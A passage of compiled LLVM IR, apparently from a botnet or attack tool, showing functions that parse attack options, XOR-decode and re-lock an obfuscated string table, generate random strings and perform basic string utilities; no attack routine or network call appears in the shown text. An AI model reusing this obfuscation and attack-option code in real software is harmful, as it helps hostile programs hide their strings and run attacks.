  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

11:                                               ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

16:                                               ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

27:                                               ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

34:                                               ; preds = %16
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11, !llvm.loop !26

38:                                               ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

40:                                               ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_int(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* noundef %20, i32 noundef 10)
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_alphastr(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [33 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = bitcast [33 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %9, i8* align 16 getelementptr inbounds ([33 x i8], [33 x i8]* @__const.rand_alphastr.alphaset, i32 0, i32 0), i64 33, i1 false)
  br label %10

10:                                               ; preds = %56, %2
  %11 = load i32, i32* %4, align 4
  %12 = icmp sgt i32 %11, 0
  br i1 %12, label %13, label %57

13:                                               ; preds = %10
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = icmp uge i64 %15, 4
  br i1 %16, label %17, label %47

17:                                               ; preds = %13
  %18 = call i32 @rand_next()
  store i32 %18, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %19

19:                                               ; preds = %39, %17
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = icmp ult i64 %21, 4
  br i1 %22, label %23, label %42

23:                                               ; preds = %19
  %24 = load i32, i32* %7, align 4
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  %27 = load i32, i32* %7, align 4
  %28 = lshr i32 %27, 8
  store i32 %28, i32* %7, align 4
  %29 = load i8, i8* %8, align 1
  %30 = zext i8 %29 to i32
  %31 = ashr i32 %30, 3
  %32 = trunc i32 %31 to i8
  store i8 %32, i8* %8, align 1
  %33 = load i8, i8* %8, align 1
  %34 = zext i8 %33 to i64
  %35 = getelementptr inbounds [33 x i8], [33 x i8]* %5, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i8*, i8** %3, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %3, align 8
  store i8 %36, i8* %37, align 1
  br label %39

39:                                               ; preds = %23
  %40 = load i32, i32* %6, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %6, align 4
  br label %19, !llvm.loop !27

42:                                               ; preds = %19
  %43 = load i32, i32* %4, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 %44, 4
  %46 = trunc i64 %45 to i32
  store i32 %46, i32* %4, align 4
  br label %56

47:                                               ; preds = %13
  %48 = call i32 @rand_next()
  %49 = zext i32 %48 to i64
  %50 = urem i64 %49, 33
  %51 = trunc i64 %50 to i8
  %52 = load i8*, i8** %3, align 8
  %53 = getelementptr inbounds i8, i8* %52, i32 1
  store i8* %53, i8** %3, align 8
  store i8 %51, i8* %52, align 1
  %54 = load i32, i32* %4, align 4
  %55 = add nsw i32 %54, -1
  store i32 %55, i32* %4, align 4
  br label %56

56:                                               ; preds = %47, %42
  br label %10, !llvm.loop !28

57:                                               ; preds = %10
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_unlock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @toggle_obf(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

34:                                               ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

83:                                               ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27, !llvm.loop !29

86:                                               ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_lock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @table_retrieve_val(i32 noundef %0, i32* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

17:                                               ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strlen(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

4:                                                ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

10:                                               ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4, !llvm.loop !30

13:                                               ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @util_strncmp(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* noundef %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* noundef %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %7, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %21, label %17

17:                                               ; preds = %3
  %18 = load i32, i32* %9, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %22

21:                                               ; preds = %17, %3
  store i8 0, i8* %4, align 1
  br label %40

22:                                               ; preds = %17
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %7, align 4
  %25 = add nsw i32 %24, -1
  store i32 %25, i32* %7, align 4
  %26 = icmp ne i32 %24, 0
  br i1 %26, label %27, label %39

27:                                               ; preds = %23
  %28 = load i8*, i8** %5, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %5, align 8
  %30 = load i8, i8* %28, align 1
  %31 = sext i8 %30 to i32
  %32 = load i8*, i8** %6, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %6, align 8
  %34 = load i8, i8* %32, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp ne i32 %31, %35
  br i1 %36, label %37, label %38

37:                                               ; preds = %27
  store i8 0, i8* %4, align 1
  br label %40

38:                                               ; preds = %27
  br label %23, !llvm.loop !31

39:                                               ; preds = %23
  store i8 1, i8* %4, align 1
  br label %40

40:                                               ; preds = %39, %37, %21
  %41 = load i8, i8* %4, align 1
  ret i8 %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @util_strcmp(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %8 = load i8*, i8** %4, align 8
  %9 = call i32 @util_strlen(i8* noundef %8)
  store i32 %9, i32* %6, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* noundef %10)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %6, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp ne i32 %12, %13
  br i1 %14, label %15, label %16

15:                                               ; preds = %2
  store i8 0, i8* %3, align 1
  br label %34

16:                                               ; preds = %2
  br label %17

17:                                               ; preds = %32, %16
  %18 = load i32, i32* %6, align 4
  %19 = add nsw i32 %18, -1
  store i32 %19, i32* %6, align 4
  %20 = icmp ne i32 %18, 0
  br i1 %20, label %21, label %33

21:                                               ; preds = %17
  %22 = load i8*, i8** %4, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %4, align 8
  %24 = load i8, i8* %22, align 1
  %25 = sext i8 %24 to i32
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i32 1
  store i8* %27, i8** %5, align 8
  %28 = load i8, i8* %26, align 1
  %29 = sext i8 %28 to i32
  %30 = icmp ne i32 %25, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %21
  store i8 0, i8* %3, align 1
  br label %34

32:                                               ; preds = %21
  br label %17, !llvm.loop !32

33:                                               ; preds = %17
  store i8 1, i8* %3, align 1
  br label %34

34:                                               ; preds = %33, %31, %15
  %35 = load i8, i8* %3, align 1
  ret i8 %35
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strcpy(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* noundef %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* noundef %8, i8* noundef %9, i32 noundef %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_memcpy(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

11:                                               ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

15:                                               ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11, !llvm.loop !33

21:                                               ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_zero(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

7:                                                ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

11:                                               ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7, !llvm.loop !34

14:                                               ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_atoi(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

11:                                               ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

16:                                               ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 noundef signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21, !llvm.loop !35

21:                                               ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

29:                                               ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

37:                                               ; preds = %32, %29
  br label %38

38:                                               ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = zext i1 %40 to i64
  %42 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %42, i64* %7, align 8
  %43 = load i64, i64* %7, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = urem i64 %43, %45
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %10, align 4
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = load i64, i64* %7, align 8
  %51 = udiv i64 %50, %49
  store i64 %51, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %52

52:                                               ; preds = %107, %38
  %53 = load i32, i32* %6, align 4
  %54 = trunc i32 %53 to i8
  %55 = call i32 @util_isdigit(i8 noundef signext %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %52
  %58 = load i32, i32* %6, align 4
  %59 = sub nsw i32 %58, 48
  store i32 %59, i32* %6, align 4
  br label %76

60:                                               ; preds = %52
  %61 = load i32, i32* %6, align 4
  %62 = trunc i32 %61 to i8
  %63 = call i32 @util_isalpha(i8 noundef signext %62)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %74

65:                                               ; preds = %60
  %66 = load i32, i32* %6, align 4
  %67 = trunc i32 %66 to i8
  %68 = call i32 @util_isupper(i8 noundef signext %67)
  %69 = icmp ne i32 %68, 0
  %70 = zext i1 %69 to i64
  %71 = select i1 %69, i32 55, i32 87
  %72 = load i32, i32* %6, align 4
  %73 = sub nsw i32 %72, %71
  store i32 %73, i32* %6, align 4
  br label %75

74:                                               ; preds = %60
  br label %112

75:                                               ; preds = %65
  br label %76

76:                                               ; preds = %75, %57
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = icmp sge i32 %77, %78
  br i1 %79, label %80, label %81

80:                                               ; preds = %76
  br label %112

81:                                               ; preds = %76
  %82 = load i32, i32* %9, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %96, label %84

84:                                               ; preds = %81
  %85 = load i64, i64* %5, align 8
  %86 = load i64, i64* %7, align 8
  %87 = icmp ugt i64 %85, %86
  br i1 %87, label %96, label %88

88:                                               ; preds = %84
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp eq i64 %89, %90
  br i1 %91, label %92, label %97

92:                                               ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = load i32, i32* %10, align 4
  %95 = icmp sgt i32 %93, %94
  br i1 %95, label %96, label %97

96:                                               ; preds = %92, %84, %81
  store i32 -1, i32* %9, align 4
  br label %106

97:                                               ; preds = %92, %88
  store i32 1, i32* %9, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* %5, align 8
  %101 = mul i64 %100, %99
  store i64 %101, i64* %5, align 8
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = add i64 %104, %103
  store i64 %105, i64* %5, align 8
  br label %106

106:                                              ; preds = %97, %96
  br label %107

107:                                              ; preds = %106
  %108 = load i8*, i8** %3, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %3, align 8
  %110 = load i8, i8* %108, align 1
  %111 = sext i8 %110 to i32
  store i32 %111, i32* %6, align 4
  br label %52

112:                                              ; preds = %80, %74
  %113 = load i32, i32* %9, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %120

115:                                              ; preds = %112
  %116 = load i32, i32* %8, align 4
  %117 = icmp ne i32 %116, 0
  %118 = zext i1 %117 to i64
  %119 = select i1 %117, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %119, i64* %5, align 8
  br label %127

120:                                              ; preds = %112
  %121 = load i32, i32* %8, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %120
  %124 = load i64, i64* %5, align 8
  %125 = sub i64 0, %124
  store i64 %125, i64* %5, align 8
  br label %126

126:                                              ; preds = %123, %120
  br label %127

127:                                              ; preds = %126, %115
  %128 = load i64, i64* %5, align 8
  %129 = trunc i64 %128 to i32
  ret i32 %129
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isspace(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

10:                                               ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

18:                                               ; preds = %14, %10, %6, %1
  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isdigit(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isalpha(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
